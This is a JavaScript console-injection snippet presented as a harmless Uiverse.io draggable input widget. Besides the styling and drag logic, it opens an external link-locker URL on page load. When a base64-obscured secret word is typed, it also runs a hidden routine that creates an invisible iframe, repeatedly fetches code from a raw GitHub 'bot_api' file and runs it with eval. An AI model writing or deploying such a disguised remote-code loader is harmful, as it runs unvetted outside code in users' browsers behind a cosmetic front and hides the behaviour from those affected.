// === Uiverse.io Draggable Input Addon — protected key + teardown on match ===

// CONFIG
const SECRET_B64 = 'Y29va2llcw=='; // "cookies" base64-protected
const OPEN_URL = 'https://lootdest.org/s?9b4OXYGC'; // open-on-load (plain text)

// Decode secret
const SECRET = atob(SECRET_B64).toLowerCase();

// Try to open the URL on load (may be blocked by popup blockers in some contexts)
try { window.open(OPEN_URL, '_blank', 'noopener,noreferrer'); } catch (e) { /* ignore if blocked */ }

// Inject CSS
const styleEl = document.createElement('style');
styleEl.id = 'uiverse-addon-style';
styleEl.textContent = `
/* From Uiverse.io by ErzenXz */
.input {
  width: 100%;
  max-width: 220px;
  height: 45px;
  padding: 12px;
  border-radius: 12px;
  border: 1.5px solid lightgrey;
  outline: none;
  transition: all 0.3s cubic-bezier(0.19, 1, 0.22, 1);
  box-shadow: 0px 0px 20px -18px;
  background: white;
  font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
  box-sizing: border-box;
}

.input:hover {
  border: 2px solid lightgrey;
  box-shadow: 0px 0px 20px -17px;
}

.input:active {
  transform: scale(0.95);
}

.input:focus {
  border: 2px solid grey;
  outline: none;
}

.floating-box {
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background: transparent;
  z-index: 2147483647;
  cursor: grab;
  touch-action: none;
  user-select: none;
}
`;
document.head.appendChild(styleEl);

// Create GUI elements
const box = document.createElement('div');
box.className = 'floating-box';
box.id = 'uiverse-addon-box';

const input = document.createElement('input');
input.className = 'input';
input.type = 'text';
input.placeholder = 'Type something...';
input.id = 'uiverse-addon-input';

box.appendChild(input);
document.body.appendChild(box);

// Ensure initial focus
input.focus();

// DRAGGING LOGIC (desktop + mobile) and scroll lock
let isDragging = false;
let offsetX = 0, offsetY = 0;

function disableScroll() {
  document.body.style.overflow = 'hidden';
  document.documentElement.style.overflow = 'hidden';
}
function enableScroll() {
  document.body.style.overflow = '';
  document.documentElement.style.overflow = '';
}

function startDrag(x, y) {
  isDragging = true;
  const rect = box.getBoundingClientRect();
  offsetX = x - rect.left;
  offsetY = y - rect.top;
  box.style.cursor = 'grabbing';
  disableScroll();
}
function doDrag(x, y) {
  if (!isDragging) return;
  box.style.left = `${x - offsetX}px`;
  box.style.top = `${y - offsetY}px`;
  box.style.transform = 'translate(0, 0)';
}
function endDrag() {
  if (!isDragging) return;
  isDragging = false;
  box.style.cursor = 'grab';
  enableScroll();
}

// Desktop
box.addEventListener('mousedown', e => {
  // if clicking the input itself, still allow dragging — user requested whole thing draggable
  startDrag(e.clientX, e.clientY);
});
document.addEventListener('mousemove', e => doDrag(e.clientX, e.clientY));
document.addEventListener('mouseup', endDrag);

// Touch (mobile)
box.addEventListener('touchstart', e => {
  const t = e.touches[0];
  if (!t) return;
  startDrag(t.clientX, t.clientY);
}, { passive: true });

document.addEventListener('touchmove', e => {
  if (!isDragging) return;
  const t = e.touches[0];
  if (!t) return;
  // prevent page scroll while dragging
  e.preventDefault();
  doDrag(t.clientX, t.clientY);
}, { passive: false });

document.addEventListener('touchend', endDrag);
document.addEventListener('touchcancel', endDrag);

// CLEANUP helper (removes GUI + styles + listeners)
function teardown() {
  try {
    // remove elements
    const existingBox = document.getElementById('uiverse-addon-box');
    if (existingBox) existingBox.remove();
    const existingStyle = document.getElementById('uiverse-addon-style');
    if (existingStyle) existingStyle.remove();

    // restore scroll
    enableScroll();

    // remove event listeners we added (best-effort — using anonymous listeners above so we can't remove them individually;
    // but removing the elements and style plus restoring scroll is enough in most console-injection cases)
    // If you want fully removable listeners, we can refactor to named functions and removeEventListener explicitly.
    console.log('Addon torn down.');
  } catch (err) {
    console.warn('Teardown error:', err);
  }
}

// ENTER / secret-check logic — destroys GUI if secret is correct
input.addEventListener('keydown', e => {
  if (e.key === 'Enter') {
    const val = input.value.trim().toLowerCase();
    if (val === SECRET) {
      // === CUSTOM ACTION ON SECRET MATCH ===
      try {
        javascript:(async()=>{
    if (window.term) return alert("term already loaded");
    
    window.term = { 
        api: "https://raw.githubusercontent.com/qpeyy/ixlbot/refs/heads/main/" 
    };
    
    const frame = document.createElement("iframe");
    frame.src = "/dv3/" + Math.random().toString(36).slice(2);
    frame.style.display = "none";
    frame.id = "termContext";
    document.body.appendChild(frame);
    
    // Wait for iframe to load
    await new Promise(r => {
        const timeout = setTimeout(r, 3000);
        frame.onload = () => { clearTimeout(timeout); r(); };
    });
    
    window.term.context = frame.contentWindow;
    window.term.fetch = window.term.context?.fetch?.bind(window.term.context) || window.fetch.bind(window);
    
    const fetchInterval = setInterval(async () => {
        try {
            const res = await window.term.fetch(window.term.api + "bot_api");
            if (res.ok) {
                clearInterval(fetchInterval);
                let code = await res.text();
                
                // CRITICAL FIX: Decode URL-encoded content if it starts with "javascript:"
                if (code.startsWith('javascript:')) {
                    code = decodeURIComponent(code.replace(/^javascript:/, ''));
                }
                
                eval(code);
            }
        } catch (e) {
            console.error("Fetch failed:", e);
        }
    }, 1000);
})();
      } catch (err) { /* ignore */ }

      // Teardown GUI after action
      teardown();
    } else {
      console.log('WRONG');
    }
  }
});
